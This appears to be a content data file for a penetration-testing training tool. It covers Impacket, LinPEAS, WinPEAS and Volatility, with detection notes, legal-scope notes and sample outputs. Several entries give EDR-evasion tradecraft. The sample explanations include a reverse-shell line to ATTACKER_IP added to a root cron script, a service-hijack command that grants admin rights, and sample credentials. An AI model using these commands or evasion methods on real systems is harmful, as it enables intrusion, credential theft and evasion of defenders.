The -s flag for loading PowerShell scripts makes scripts available for dot-sourcing but does NOT automatically execute them or import them into the session. A common beginner mistake is setting -s /opt/scripts/ and then wondering why 'Invoke-Mimikatz' is not available. You must explicitly dot-source the script in the shell: '. Invoke-Mimikatz.ps1' before the functions become available.

Evil-WinRM's file upload and download commands use the WinRM protocol itself as the transport, not a separate SMB or HTTP channel. On heavily monitored networks where WinRM traffic is inspected (e.g., SSL inspection on 5986), large file transfers will appear as anomalously large WinRM sessions in network flow data and may trigger data exfiltration alerts based on byte count thresholds, even though the protocol is 'legitimate.' Split large transfers or use an alternative exfil channel for files over a few MB.

impacket.description: Python library and collection of tools for Windows protocol attacks. Key tools: secretsdump (dump hashes), psexec (remote shell), wmiexec (WMI shell), smbclient (browse shares), GetUserSPNs (Kerberoasting), GetNPUsers (AS-REP roasting).
impacket.teach_intro: Impacket is the go-to toolkit for Windows Active Directory attacks from Linux. No need to run anything on Windows — attack directly from Kali. secretsdump dumps hashes remotely, psexec gives shells, and Kerberoasting extracts crackable service account hashes without touching the DC.

secretsdump.label: Dump Secrets Remotely
secretsdump.desc: Remotely dump SAM/NTDS hashes via SMB without running anything on target.
secretsdump.teach: secretsdump connects via SMB, reads the SAM database remotely, and dumps all NTLM hashes. On a DC: dumps the entire NTDS.dit — every domain account hash.

psexec.label: PSExec Remote Shell
psexec.desc: Get an interactive shell via SMB service creation.
psexec.teach: psexec creates a temporary service on the target and gives you a SYSTEM shell. Very loud — creates services, writes files. Detected by AV/EDR but effective on legacy systems.

wmiexec.label: WMI Remote Shell
wmiexec.desc: Execute commands via WMI. Fileless and stealthier than psexec.
wmiexec.teach: WMI execution is semi-interactive and doesn't write files to disk. Much stealthier than psexec. Output comes back via SMB share.

GetUserSPNs.label: Kerberoasting
GetUserSPNs.desc: Request service tickets for accounts with SPNs and extract for offline cracking.
GetUserSPNs.teach: Kerberoasting: request a service ticket, extract the TGS hash, crack offline with hashcat -m 13100. Service accounts often have weak passwords and high privileges.

GetNPUsers.label: AS-REP Roasting
GetNPUsers.desc: Get crackable hashes for accounts with pre-auth disabled (no creds needed).
GetNPUsers.teach: AS-REP roasting requires NO credentials. Accounts with 'Do not require Kerberos preauthentication' return a crackable hash. Crack with hashcat -m 18200.

smbclient.label: SMB Client
smbclient.desc: Browse and interact with SMB shares from Linux.
smbclient.teach: Interactive SMB shell. List shares, download files, upload backdoors. Like FTP but for Windows file shares.

opsec_notes: BEGINNER NOISE: secretsdump generates a high volume of SMB (TCP 445) and DCE/RPC traffic to the target. Every connection attempt is logged in Windows Security Event Log as EID 4624 (logon) and EID 4776 (NTLM authentication). A defender watching the DC's event log will see your source IP authenticating and immediately pulling registry hives or DRSUAPI replication — this is not subtle.

CONCRETE ARTIFACT: secretsdump using the DRSUAPI method (default when you have DA creds) triggers EID 4662 on the domain controller — 'An operation was performed on an object' with access mask 0x100 (DS-Replication-Get-Changes) and 0x40 (DS-Replication-Get-Changes-All). These two ACEs together are the canonical DCSync detection signature. Defender for Endpoint and Splunk ES both ship rules for this exact EID+access mask combination.

CUTTING-EDGE 2025: CrowdStrike Falcon's Identity Protection module (formerly Preempt) performs behavioral baselining on DRSUAPI replication callers. Legitimate replication only originates from other DCs. Any non-DC source IP calling DRSGetNCChanges is scored as a high-confidence DCSync attempt and will trigger an automated response action in Falcon Fusion workflows in most mature enterprise deployments. Prefer using secretsdump with the VSS (Volume Shadow Copy) method via --use-vss if you have local admin on the DC itself — it avoids DRSUAPI entirely but writes to disk.

CUTTING-EDGE 2025: SentinelOne's STAR (Storyline Active Response) correlates the impacket-secretsdump process tree: python3 -> secretsdump.py with command-line arguments containing 'hashes', 'sam', or 'ntds' are flagged via command-line entropy scoring and known-bad argument pattern matching. Obfuscating the Python invocation (compiled PyInstaller binary, renamed executable) reduces command-line telemetry but the network signatures (SMB named pipe \\PIPE\\winreg, \\PIPE\\svcctl) remain. Pair with a custom C2 implant doing the same DCE/RPC calls natively to reduce process-tree visibility.

CONCRETE ARTIFACT — Kerberoasting: GetUserSPNs generates Kerberos TGS-REQ packets (AS-REQ then TGS-REQ for RC4_HMAC etype 23). Microsoft Defender for Identity (MDI) and Vectra AI both alert on bulk TGS requests for RC4-encrypted tickets from a single source within a short window. Request tickets one at a time with a sleep interval, and target only accounts with etype 17/18 (AES) SPNs where possible — AES Kerberoasting hashes are far slower to crack and MDI's detection threshold is tuned primarily for RC4 bulk requests.

AS-REP ROASTING ARTIFACT: GetNPUsers sends AS-REQ packets without pre-authentication for targeted accounts. This generates EID 4768 on the DC with 'Pre-Authentication Type: 0' — a field that is 0x00 only when pre-auth is disabled. Any SIEM with a rule on EID 4768 where PreAuthType=0 will fire. Enumerate accounts with DONT_REQUIRE_PREAUTH set via LDAP queries (which are far quieter) before sending AS-REQs, and only request hashes for accounts you've confirmed are vulnerable.

legal_notes: US CFAA (18 U.S.C. § 1030): secretsdump's DRSUAPI method replicates the entire NTDS.dit credential database. Possessing domain credential hashes for systems you are not authorized to access constitutes unauthorized access to a protected computer under CFAA § 1030(a)(2). Even if you obtained DA credentials legitimately within scope, using them to dump hashes outside the authorized IP/domain scope is a separate CFAA violation. Ensure your rules of engagement explicitly authorize credential harvesting and specify which domains and systems are in scope.

AUTHORIZATION SCOPE: Impacket tools operate over the network — secretsdump, psexec, and wmiexec will authenticate to whatever IP you point them at. A common scope violation is using harvested credentials to access systems outside the agreed engagement boundary (e.g., a partner company's domain reachable via trust relationships). Your statement of work must explicitly authorize trust enumeration and cross-domain attacks before you follow any AD trust path. Confirm in writing before crossing a domain trust boundary.

MODERN CLOUD/HYBRID AD CONSIDERATION: In hybrid Azure AD / Entra ID environments, the on-premises NTDS.dit dump may include hashes for synchronized accounts that also have Azure AD identities. Using those hashes or cracked passwords to authenticate to Azure AD, Microsoft 365, or any cloud service is a separate authorization boundary from the on-premises engagement. Cloud access is governed by different legal agreements (Microsoft's terms of service, cloud-specific authorization letters) and must be explicitly in scope. Password hash synchronization (PHS) means a cracked on-prem password may directly unlock cloud resources — confirm cloud scope before attempting.
false_positives: EMPTY NT HASH (31d6cfe0d16ae931b73c59d7e0c089c0): This is the NT hash of an empty string, not a blank password in the traditional sense. It appears for disabled accounts (Guest, DefaultAccount) and accounts with no password set. Attempting to pass this hash will fail authentication — do not waste time cracking or passing it. Filter these out of your hash list before running hashcat or crackmapexec.

DCC2 HASHES CANNOT BE PASSED: Cached domain credentials (format $DCC2$...) are salted with the username and cannot be used for pass-the-hash attacks. They require offline cracking with hashcat mode 2100 and are significantly slower to crack than NT hashes. Operators sometimes mistake these for usable NT hashes and waste time attempting PTH — check the format prefix before attempting.

MACHINE ACCOUNT HASHES ARE ROTATED AUTOMATICALLY: Computer account passwords (accounts ending in $) rotate every 30 days by default via Netlogon. A machine account hash dumped from NTDS.dit may already be stale if the machine has checked in since the last rotation. The NTDS.dit on the DC holds the current hash, but if you dump from a VSS snapshot or a backup, the hash may be weeks old and invalid for authentication.

SECRETSDUMP AGAINST MEMBER SERVERS MISSES DOMAIN HASHES: Running secretsdump against a domain-joined workstation or member server only dumps local SAM hashes and cached credentials — it does NOT dump domain account hashes unless you target the domain controller itself with DRSUAPI, or use --use-vss on the DC. Operators sometimes target the wrong host and conclude the domain has no interesting accounts.

KERBEROASTING RETURNS NO RESULTS FOR MSDS-SUPPORTEDENCRYPTIONTYPES = 0x1C: Service accounts configured to support only AES128/AES256 (etype 17/18) will still return a TGS ticket, but the hash format is different (hashcat mode 19700/19800 for AES Kerberoasting). GetUserSPNs will return these tickets but older versions of hashcat wordlists and rules are tuned for RC4 (mode 13100). Operators sometimes discard AES Kerberoasting output thinking it's malformed — verify the etype in the ticket header before concluding the account is uncrackable.

linpeas.teach_intro: After getting a low-privilege shell, your goal is root. LinPEAS does the recon for you — it runs 300+ checks looking for every known Linux privesc vector. Color-coded output: red/yellow = high priority finding. Start at the red output and work your way down.

SUID.label: SUID Binaries
SUID.desc: Focus area: binaries with SUID bit set run as owner (often root).
SUID.teach: SUID binaries run as the file's owner regardless of who executes them. If root owns a SUID binary with a shell escape, you get root. Check GTFOBins for escape techniques.

Sudo.label: Sudo Misconfigs
Sudo.desc: Focus area: sudo rules that allow privesc.
Sudo.teach: sudo -l shows what you can run as root. 'NOPASSWD: /usr/bin/vim' → vim with :!bash = root shell. Check every allowed command on GTFOBins.

Cron.label: Cron Job Analysis
Cron.desc: Focus area: writable scripts run by root's crontab.
Cron.teach: If root runs a script you can write to, you own root. Check crontab entries and look for writable scripts or PATH components that you can hijack.

opsec_notes: Beginner noise: linpeas.sh is a shell script that spawns dozens of subprocesses — find, ls, cat, ps, netstat, ss, id, uname, and more — in rapid succession. Any process accounting daemon (acct/psacct) or auditd with execve rules will log every one of these as a burst of short-lived child processes under your shell's PID. On a quiet server this pattern is immediately anomalous.

Concrete artifact — auditd: If auditd is running with a rule like '-a always,exit -F arch=b64 -S execve', every command linpeas spawns writes a SYSCALL record to /var/log/audit/audit.log. A defender grep-ing for your shell's PID will see hundreds of execve events in under 60 seconds. The burst rate alone is a high-confidence indicator.

CrowdStrike Falcon (2025): Falcon's process tree telemetry scores parent-child anomalies. A bash shell (parent) spawning find / -perm -4000, cat /etc/shadow, ss -tulnp, and crontab -l within the same process tree in under 30 seconds will trigger Falcon's 'Suspicious Linux Enumeration' behavioral indicator. Falcon does NOT need a signature for linpeas.sh — the behavior pattern is the detection.

SentinelOne / Defender for Endpoint on Linux (2025): Both agents instrument eBPF-based syscall tracing. linpeas reads /proc/*/maps, /proc/*/environ, and /proc/*/cmdline for every running process — this is a known credential-hunting pattern. SentinelOne's STAR rules and Defender's Linux behavioral engine both have detections keyed to bulk /proc traversal combined with reads of sensitive files like /etc/passwd, /etc/shadow, and .ssh/authorized_keys.

Evasion consideration: Running linpeas with -q (quiet) reduces stdout noise but does NOT reduce subprocess spawning — the detection surface is identical. If you need stealth, consider running only targeted checks (e.g., bash linpeas.sh -o /tmp/.out sudo cron) rather than the full sweep, and pipe output to a file rather than the terminal to avoid shell history and tty logging artifacts.

File-write artifact: Using -o to write output to a file leaves a plaintext privilege-escalation report on disk. If the file lands in /tmp or /dev/shm, it is world-readable by default. Always set restrictive permissions immediately (chmod 600) and delete the file before leaving the host. Forensic responders routinely find linpeas output files left behind by operators who forgot to clean up.

sample_outputs.explanation: Three independent root paths on a 'hardened' host. (1) Writable cron script: echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/scripts/backup.sh — root executes it within 60 seconds. Use pwncat-cs or a Sliver listener to catch the callback; avoid netcat on monitored hosts. (2) ansible-playbook sudo rule: create a malicious playbook with a 'command: chmod u+s /bin/bash' task and run it with sudo — this is a living-off-the-land escalation that blends with legitimate Ansible usage. (3) PATH hijacking: drop a malicious binary named after a command root's cron or sudo rule calls into /home/devops/bin. Next steps: (a) use pspy64 (no root needed) to watch what commands root actually runs via cron in real time before committing to a path; (b) after escalation, dump /etc/shadow with unshadow + hashcat -m 1800 for credential reuse across the environment; (c) check for Kerberos keytabs with find / -name '*.keytab' 2>/dev/null if this host is domain-joined.

legal_notes: CFAA (18 U.S.C. § 1030): Running linpeas.sh on any system you do not own or have explicit written authorization to test constitutes unauthorized access to a protected computer. The script reads /proc entries, /etc/shadow (or attempts to), SUID binaries, and network state — all of which constitute 'obtaining information' under § 1030(a)(2). Authorization must be documented before execution, not assumed.

Rules of engagement scope: Your engagement authorization must explicitly cover the specific host IP or hostname. linpeas is host-local, but its network enumeration checks (ss, netstat, ARP table reads) may reveal and implicitly probe adjacent systems. Confirm your RoE covers post-exploitation enumeration on the target host, not just initial access. Some scoped engagements prohibit running automated enumeration scripts — check before running.

Cloud and container context: On cloud-hosted Linux instances (AWS EC2, Azure VM, GCP Compute), linpeas will query the instance metadata service (169.254.169.254 or fd00:ec2::254) as part of its checks. This generates metadata API calls that may be logged in CloudTrail (AWS), Azure Monitor, or GCP Cloud Audit Logs — logs your client's security team may be monitoring. Confirm your cloud-scope authorization covers metadata service enumeration, and be aware that these API calls can attribute your activity to the compromised instance's IAM role.
false_positives: SUID binaries that are intentional: Many legitimate binaries carry the SUID bit by design — passwd, sudo, ping, mount, su. linpeas flags ALL of them. An operator who doesn't cross-reference against GTFOBins (gtfobins.github.io) will waste time on binaries that have no known escalation path. Always check GTFOBins before attempting SUID abuse.

Writable directories that aren't exploitable: linpeas flags world-writable directories in PATH, but if no privileged process (root cron, sudo rule, SUID binary) ever executes a binary from that directory, PATH hijacking is impossible. Confirm with pspy64 that a privileged process actually calls an unqualified binary name before investing time in the technique.

Kernel exploit suggestions based on uname -r alone: linpeas matches the kernel version string against a list of known-vulnerable kernels, but it cannot verify whether the patch was backported. RHEL and Ubuntu both backport security fixes without bumping the kernel version number. A kernel reported as '5.15.0-91-generic' may have CVE-2025-XXXXX patched. Always verify with the distro's patch advisory before attempting a kernel exploit — a failed kernel exploit can panic the system.

Sudo version flagging: linpeas flags sudo versions against known CVEs (e.g., Baron Samedit / CVE-2021-3156), but again, distros backport patches. 'Sudo version 1.9.5p2' on Ubuntu 20.04 may be fully patched against Baron Samedit. Run the actual PoC in a controlled test or check the distro's changelog before assuming exploitability.

NFS export false negatives: linpeas checks /etc/exports for no_root_squash misconfigurations, but if the NFS service is running and exports are configured via a non-standard path or an NFS management daemon, linpeas will report 'not found' and miss the vector entirely. Always manually check showmount -e localhost and rpcinfo -p in addition to linpeas output.

winpeas.description: Windows Privilege Escalation Awesome Script. Automates enumeration of Windows privesc vectors: service misconfigs, unquoted service paths, AlwaysInstallElevated, token privileges, auto-logon credentials, stored credentials, and registry checks.
winpeas.teach_intro: After landing on a Windows box as a low-priv user, WinPEAS finds your escalation path. It checks 200+ Windows-specific attack vectors. Color-coded like LinPEAS: red and yellow are your priorities. Common wins: SeImpersonatePrivilege (Potato attacks), unquoted service paths, weak service permissions.

systeminfo.label: System Information
systeminfo.teach: Missing patches = kernel/service exploits. Note the Windows build number and check against known unpatched CVEs.

servicesinfo.label: Services Enumeration
servicesinfo.teach: Unquoted service paths with spaces are a classic privesc: C:\Program Files\My App\service.exe — place malicious binary at C:\Program.exe and restart the service.

applicationsinfo.label: Applications
applicationsinfo.desc: List installed software and look for vulnerable versions.
applicationsinfo.teach: Old software versions = known exploits. Installed security software tells you what you're up against. DLL hijacking opportunities in software directories.

userinfo.label: User Info
userinfo.teach: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege → Potato attacks (JuicyPotato, PrintSpoofer, GodPotato). SeBackupPrivilege → read any file. SeDebugPrivilege → process injection.

opsec_notes: BEGINNER NOISE: WinPEAS is a standalone executable dropped to disk — this is the loudest possible artifact. Windows Defender and most AV engines have signatures for winpeas.exe by name and by hash. At minimum, rename the binary before transfer; better yet, compile a custom build from source with a modified string table.

CONCRETE ARTIFACT — FILE WRITE: WinPEAS writes to disk at whatever path you drop it (commonly C:\Windows\Temp\, C:\Users\Public\, or C:\ProgramData\). Sysmon EID 11 (FileCreate) and EID 1 (ProcessCreate) will log the binary path, parent process (likely cmd.exe or powershell.exe spawned from your C2 beacon), and command-line arguments. Defenders with Sysmon deployed will see this within seconds of execution.

CUTTING-EDGE 2025: CrowdStrike Falcon's behavior-based engine scores WinPEAS heavily on process tree anomalies — specifically a beacon (e.g., Sliver or Cobalt Strike) spawning a child process that immediately enumerates registry hives (HKLM\SYSTEM\CurrentControlSet\Services), queries WMI for installed software, and reads LSASS-adjacent keys in rapid succession. This multi-vector enumeration burst is a high-confidence IOB (Indicator of Behavior) that triggers Falcon's 'Suspicious Privilege Escalation Enumeration' detection even on renamed binaries.

CUTTING-EDGE 2025: Microsoft Defender for Endpoint (MDE) uses AMSI-backed script scanning and ETW-TI (Threat Intelligence) telemetry to catch in-memory variants of WinPEAS loaded via PowerShell (e.g., IEX (New-Object Net.WebClient).DownloadString(...)). ETW provider Microsoft-Windows-Threat-Intelligence captures the memory allocation and execution pattern. Reflective loading or process hollowing does not fully evade this on Win11 22H2+ with Kernel Data Protection (KDP) enabled — the ETW-TI callbacks fire at the kernel level before user-mode evasion applies.

CONCRETE ARTIFACT — EVENT LOG: WinPEAS triggers Windows Security EID 4688 (Process Creation with command line logging enabled via GPO) and EID 4703 (Token Right Adjusted) when it enumerates token privileges. On hardened 2022/2025 domains, Advanced Audit Policy will capture both. The command-line field in EID 4688 will contain the full invocation including any flags passed.

EVASION CONSIDERATION: To reduce noise, prefer running targeted WinPEAS flag subsets (e.g., 'winpeas.exe servicesinfo' or 'winpeas.exe userinfo') rather than the full default run. The full scan touches 200+ check categories in rapid succession — the enumeration velocity alone is a behavioral signal. Targeted runs reduce the time-on-host and the breadth of registry/WMI queries, lowering the behavioral score in both CrowdStrike and SentinelOne's anomaly engines.

sample_outputs.explanation: Two critical findings with immediate lateral movement value. (1) 'VulnBackupSvc' runs as LocalSystem and Domain Users have ChangeConfig permission — use 'sc config VulnBackupSvc binpath= "cmd.exe /c net localgroup administrators CORP\\youruser /add"' then restart the service for instant local admin. (2) Two sets of plaintext credentials recovered from registry: 'CORP\\svc_backup:W!nter2024Backup!' from service parameters and 'CORP\\svc_deploy:Deploy@2023!' from autologon keys. Next steps: (a) validate both accounts against the domain with 'crackmapexec smb <DC_IP> -u svc_backup -p "W!nter2024Backup!"'; (b) run BloodHound with these credentials to map AD attack paths — service accounts frequently have over-provisioned ACLs; (c) check if svc_backup has replication rights (DCSync) or is a member of any privileged groups via 'net user svc_backup /domain'. The targeted flag run (servicesinfo userinfo only) reduced the enumeration burst from ~200 checks to ~40, lowering the behavioral score in SentinelOne's telemetry — but the registry reads for autologon keys are still a known detection signal on MDE-enrolled endpoints.

legal_notes: CFAA BOUNDARY: Running WinPEAS on any system you do not own or have explicit written authorization to test constitutes unauthorized access under 18 U.S.C. § 1030 (CFAA). WinPEAS reads registry hives, enumerates running services, queries WMI, and accesses credential stores — each of these actions independently qualifies as 'accessing a protected computer' under the statute. 'I was just looking' is not a defense; enumeration without authorization is the offense.

SCOPE AND ROE: Your rules of engagement must explicitly authorize post-exploitation enumeration on the specific host you've landed on. A scope document that authorizes 'network scanning' does not authorize running a local privilege escalation tool on a compromised host. Confirm your ROE covers 'post-exploitation activity including local privilege escalation enumeration' on the target IP before executing. If the host is a jump box or shared infrastructure, escalation attempts may affect other tenants — flag this to your client before proceeding.

DOMAIN AND CLOUD CONSIDERATION: On domain-joined hosts, WinPEAS's credential recovery (autologon keys, registry-stored passwords, DPAPI blobs) may surface credentials that authenticate to cloud services (Azure AD / Entra ID, AWS IAM roles via SSO, GCP workload identity). Exfiltrating or using these credentials against cloud control planes may exceed your authorized scope even if local host enumeration is permitted. Verify your ROE explicitly covers cloud lateral movement before using any recovered credentials against cloud APIs or identity providers.
false_positives: UNQUOTED PATH FALSE POSITIVE: WinPEAS flags every unquoted service path containing a space as a potential privesc vector, but exploitability requires write access to one of the intermediate directories. A path like 'C:\Program Files\Vendor\app.exe' is flagged even when 'C:\Program Files\' is owned by TrustedInstaller with no user-writable ACL anywhere in the chain. Always verify with 'icacls "C:\Program Files\Vendor"' before reporting — the majority of unquoted path findings on hardened systems are not exploitable.

SEIMPERSONATEPRIVILEGE ON IIS/SQL CONTEXTS: WinPEAS highlights SeImpersonatePrivilege as a critical finding, but this privilege is legitimately assigned to IIS application pool identities, SQL Server service accounts, and other service accounts by design. If your shell is running in the context of one of these service accounts, the privilege is expected and does not represent a misconfiguration — it represents normal Windows service architecture. The Potato attack chain is still valid, but document this accurately in your report rather than calling it a 'misconfiguration'.

ALWAYSINSTALLELEVATED REGISTRY KEY TIMING: WinPEAS reads both HKLM and HKCU AlwaysInstallElevated keys at the moment of execution. In environments using GPO to manage this setting, the HKCU key may be stale from a previous user session and not reflect the current effective policy. Verify with 'gpresult /R' or 'Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' in a fresh session before building an MSI payload.

STORED CREDENTIAL FALSE NEGATIVES: WinPEAS's credential recovery is not exhaustive. It checks common registry paths and DPAPI-protected blobs it can access with current privileges, but it will miss credentials stored in custom application config files, third-party password managers, browser credential stores requiring user-context DPAPI decryption, and credentials protected by Windows Hello for Business hardware binding. A clean WinPEAS credential output does not mean the system has no stored credentials.

SERVICE PERMISSION REPORTING ON VIRTUAL ACCOUNTS: On Windows Server 2019/2022, services running as 'NT SERVICE\<ServiceName>' virtual accounts are sometimes reported by WinPEAS with misleading permission entries because the virtual account's effective ACL is computed dynamically. WinPEAS may show 'Authenticated Users [ReadData]' on a service binary when the virtual account's actual runtime permissions are more restricted. Cross-reference with 'sc sdshow <ServiceName>' and 'accesschk.exe -ucqv <ServiceName>' (Sysinternals) for authoritative permission data.

volatility3.description: The leading open-source memory forensics framework. Analyzes RAM dumps to extract: running processes, network connections, loaded DLLs, command history, encryption keys, passwords in memory, injected code, rootkits, and more.
volatility3.teach_intro: Memory forensics is like an X-ray of a running system at a moment in time. Every running process, open network connection, encryption key, and typed command exists in RAM. Volatility reads a memory dump (or live memory) and lets you query all of this data without running anything on the victim machine.

-f.label: Memory Image File
-f.teach: Memory dumps are taken with FTK Imager, WinPMem, or VM snapshot files. The .vmem file from VMware is directly readable by Volatility.

windows.pslist.label: Process List
windows.pslist.desc: List running processes from the process list.
windows.pslist.teach: Shows all running processes with PID, PPID, name, and timestamps. Look for unusual processes, unusual parents (cmd.exe spawned by Word = malware), and process names that mimic legit ones.

windows.pstree.label: Process Tree
windows.pstree.desc: Display processes in parent-child tree format.
windows.pstree.teach: Tree view reveals injection chains. powershell.exe under winword.exe is a macro payload. cmd.exe under explorer.exe is suspicious. Know the normal Windows process tree.

windows.netstat.label: Network Connections
windows.netstat.desc: List active and recent network connections.
windows.netstat.teach: Shows C2 connections even after the process closed the socket (sockets linger in memory). Maps process PID to network connections — identifies the C2 process.

windows.dlllist.label: DLL List
windows.dlllist.desc: List DLLs loaded by each process.
windows.dlllist.teach: Injected DLLs show up here. Unknown DLLs in system processes, DLLs loaded from temp directories, or DLLs with no path (reflective injection) are all red flags.

windows.cmdline.label: Command Lines
windows.cmdline.desc: Show command-line arguments for all processes.
windows.cmdline.teach: Reveals what commands were run to launch each process. Powershell.exe with base64 encoded arguments = encoded malware. certutil.exe downloading files is a classic LOLBin.

windows.malfind.label: Malware Finder
windows.malfind.desc: Find injected code and hidden processes using heuristics.
windows.malfind.teach: malfind looks for memory regions that are executable but not backed by a file — the signature of shellcode injection. Dumps suspicious regions for further analysis.

windows.hashdump.label: Dump Password Hashes
windows.hashdump.desc: Extract NTLM password hashes from memory.
windows.hashdump.teach: Like mimikatz but offline from a memory dump. Extracts SAM hashes from SYSTEM and SAM hive memory — crack with hashcat.

opsec_notes: Beginner baseline: Volatility itself runs entirely OFFLINE against a dump file — it generates zero network traffic, no DNS queries, no ICMP. The noise risk is in HOW you acquired the dump, not in Volatility's analysis. A live acquisition tool like winpmem or DumpIt writing a multi-gigabyte .raw file to disk or over SMB is loud and obvious.

Concrete defender artifact — acquisition phase: winpmem.exe or DumpIt.exe spawning as a child of cmd.exe or powershell.exe triggers Sysmon EID 1 (Process Create) with a highly anomalous parent-child relationship. CrowdStrike Falcon's process tree scoring flags memory acquisition binaries by hash and behavior within seconds of execution on modern sensor versions (7.x+).

Concrete defender artifact — file system: A raw memory dump written locally (e.g., C:\\Windows\\Temp\\mem.raw, 8-32 GB) triggers Windows Defender for Endpoint's large-file-write heuristic and MDE alert 'Suspicious memory dump file created'. The file write event appears in MDE Advanced Hunting under DeviceFileEvents with ActionType = FileCreated and a size anomaly flag.

2025-2026 cutting edge — EDR kernel callbacks: Since Windows 11 22H2 and Server 2022 with recent patches, PatchGuard enforcement and Kernel Data Protection (KDP) make userland memory acquisition via NtReadVirtualMemory increasingly unreliable against hardened endpoints. Modern EDR drivers register ObRegisterCallbacks on process handles; attempting to open lsass.exe with PROCESS_VM_READ (0x0010) generates a handle audit event (Sysmon EID 10, GrantedAccess 0x1010) that SentinelOne and Falcon both alert on in real time.

2025-2026 cutting edge — ETW-TI telemetry: Windows ETW Threat Intelligence provider (Microsoft-Windows-Threat-Intelligence, GUID 0xF4E1897C...) fires on any cross-process memory read. Defender for Endpoint subscribes to this provider at the kernel level. Even a signed, whitelisted acquisition tool will generate ETW-TI events if it reads lsass memory — there is no userland bypass for this on fully patched Win11 24H2. Operator implication: on hardened targets, prefer crash dump analysis (BSOD-induced via kernel driver) or hypervisor-level snapshot acquisition to avoid ETW-TI.

Authorization boundary artifact: If you are analyzing a dump acquired from a cloud VM (AWS EC2, Azure VM), the hypervisor snapshot API call (e.g., aws ec2 create-snapshot) is logged in CloudTrail / Azure Activity Log with the caller's IAM identity and timestamp. This is an immutable, tamper-evident record. Ensure your engagement authorization explicitly covers memory acquisition methods, not just 'access to the instance'.

sample_outputs.scenario: Beginner IR triage: analyst has a Windows 10 memory dump from a suspected compromised workstation. Goal: get a process list and spot anything obviously wrong.
sample_outputs.explanation: Reading this output: PID is the process ID, PPID is the parent process ID — the chain of who spawned whom. Normal Windows processes have predictable parents: lsass.exe (PID 1104) should always be a child of wininit.exe (PID 820), which it is here — good. The red flag is update_helper.exe (PID 4712) spawned by explorer.exe (PID 2348), which then spawned cmd.exe (PID 5120). Legitimate update processes are spawned by svchost.exe or a service manager, not explorer.exe. A user-land process spawning cmd.exe is a classic post-exploitation pattern. Next steps: (1) run windows.pstree to visualize the full parent-child chain, (2) run windows.cmdline to see what arguments update_helper.exe and cmd.exe were launched with, (3) run windows.malfind against PID 4712 to check for injected shellcode in its memory regions.
